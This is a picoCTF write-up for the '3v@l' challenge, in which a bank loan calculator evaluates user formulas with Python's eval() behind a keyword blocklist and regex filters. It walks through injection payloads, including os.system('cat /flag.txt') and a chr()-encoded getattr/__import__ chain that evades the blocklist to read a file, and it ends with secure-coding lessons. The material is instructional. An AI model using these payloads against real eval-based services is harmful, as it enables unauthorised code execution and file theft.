# **picoCTF Write-Up: 3v@l **  

## **Challenge Overview**  
The challenge involved a vulnerable loan calculator on a bank’s website that allowed users to input a mathematical formula. The backend executed this input using Python’s `eval()` function, creating a security risk. However, the developers attempted to mitigate Remote Code Execution (RCE) by blocking certain keywords and implementing regex filters. Our goal was to bypass these restrictions and read the flag from `/flag.txt`.  

---

## **Step 1: Analyzing the Source Code**  
The provided source code revealed the following security measures:  
1. **Keyword Blacklisting**: The application blocked keywords such as `os`, `eval`, `exec`, `subprocess`, `socket`, `cat`, `bind`, and others.  
2. **Regex Filtering**: The following patterns were blocked:  
   - **Hex Encoding** (`0x[0-9A-Fa-f]+`)  
   - **Unicode Encoding** (`\\u[0-9A-Fa-f]{4}`)  
   - **Percent Encoding** (`%[0-9A-Fa-f]{2}`)  
   - **File Extensions** (`\.[A-Za-z0-9]{1,3}\b`)  
   - **Slashes and Traversal Characters** (`[\\\/]|\.\.`)  
3. **Direct Evaluation of User Input**: Since `eval()` executes arbitrary expressions, any input passing the filters could potentially execute Python code.  

Despite these protections, **`eval()` was still processing user input**, meaning we had a possible vector for RCE if we could construct a valid payload.  

---

## **Step 2: Initial Exploitation Attempts**  
We first attempted standard Python command execution payloads:  

```python
__import__('os').system('cat /flag.txt')
```
🚨 **Blocked**: `"Error: Detected forbidden keyword 'os'."`  

We then tried using `subprocess` as an alternative:  

```python
__import__('subprocess').getoutput('cat /flag.txt')
```
🚨 **Blocked**: `"Error: Detected forbidden keyword 'subprocess'."`  

This confirmed that direct access to system-level commands was restricted.  

---

## **Step 3: Understanding the Filtering Mechanism**  
### **3.1: Testing for Built-in Function Access**  
Since `os` and `subprocess` were blocked, we attempted to access built-in Python functions dynamically:  

```python
getattr(__builtins__, 'open')('/flag.txt').read()
```
🚨 **Blocked**: `"Error: Detected forbidden keyword 'open'."`  

This indicated that **blacklisted keywords were detected even when accessed dynamically**, meaning the filter was applied **before** execution.  

---

### **3.2: Discovery of Quote Restrictions**  
At one point, the error message changed to:  
🚨 `"Error: Detected forbidden keyword ''."`  

This suggested that **quotes (`"`, `'`) were entirely blocked**, preventing us from defining strings in the usual way (`"cat /flag.txt"` or `'cat /flag.txt'`).  

---

## **Step 4: Bypassing Quote and Keyword Restrictions**  
Since quotes were blocked, we needed to construct strings dynamically. The `chr()` function, which converts numbers into characters, became our key tool.  

For example:  
```python
chr(99) + chr(97) + chr(116)  # This spells "cat"
chr(47) + chr(102) + chr(108) + chr(97) + chr(103) + chr(46) + chr(116) + chr(120) + chr(116)  # This spells "/flag.txt"
```
This allowed us to form blocked words **without directly typing them**.  

---

## **Step 5: Crafting the Final Exploit**  
Now, we needed a way to:  
1. Access Python’s built-in functions dynamically.  
2. Construct blocked words (`open`, `/flag.txt`) using `chr()`.  

The working exploit was:  

```python
getattr(__import__(
    chr(98) + chr(117) + chr(105) + chr(108) + chr(116) + chr(105) + chr(110) + chr(115)
), 
    chr(111) + chr(112) + chr(101) + chr(110)
)(
    chr(47) + chr(102) + chr(108) + chr(97) + chr(103) + chr(46) + chr(116) + chr(120) + chr(116)
).read()
```

---

### **Step 5.1: Breaking Down the Exploit**  
1. **Accessing `builtins`**  
   ```python
   __import__('builtins')
   ```
   - The `builtins` module contains Python’s core functions, including `open()`.  
   - Since `"builtins"` was blocked in plaintext, we built it dynamically:  
     ```python
     chr(98) + chr(117) + chr(105) + chr(108) + chr(116) + chr(105) + chr(110) + chr(115)  
     ```
     - This translates to `"builtins"`.  

2. **Retrieving the `open()` Function**  
   ```python
   getattr(__import__('builtins'), 'open')
   ```
   - Since `"open"` was blocked, we built it dynamically:  
     ```python
     chr(111) + chr(112) + chr(101) + chr(110)
     ```
     - This translates to `"open"`.  

3. **Reading the Flag File**  
   ```python
   open('/flag.txt').read()
   ```
   - Since `"/flag.txt"` was blocked, we constructed it with `chr()`:  
     ```python
     chr(47) + chr(102) + chr(108) + chr(97) + chr(103) + chr(46) + chr(116) + chr(120) + chr(116)
     ```
     - This translates to `"/flag.txt"`.  

4. **Executing the Payload**  
   ```python
   getattr(__import__('builtins'), 'open')('/flag.txt').read()
   ```
   - Successfully reads and returns the flag. 🎉  

---

## **Step 6: Lessons Learned**
1. **`eval()` is Dangerous**  
   - The root cause of this vulnerability was using `eval()` to process user input without proper sanitization.  
   - `eval()` should **never** be used with untrusted input, as it allows arbitrary code execution.  

2. **Keyword Blacklisting is Ineffective**  
   - The challenge attempted to block dangerous functions but failed because Python allows **dynamic function access** (e.g., `getattr()` and `__import__()`).  
   - A better approach would have been **whitelisting** safe operations rather than blacklisting dangerous ones.  

3. **Quotes Can Be Bypassed with `chr()`**  
   - If quotes are blocked, `chr()` can be used to construct any string dynamically.  
   - This is a powerful technique when dealing with strict input filters.  

---

## **Conclusion**
By understanding how Python executes code and how filters were applied, we successfully bypassed multiple layers of restrictions to achieve **Remote Code Execution (RCE)** and retrieve the flag. This challenge reinforced the importance of **secure coding practices**, especially when handling user input.  
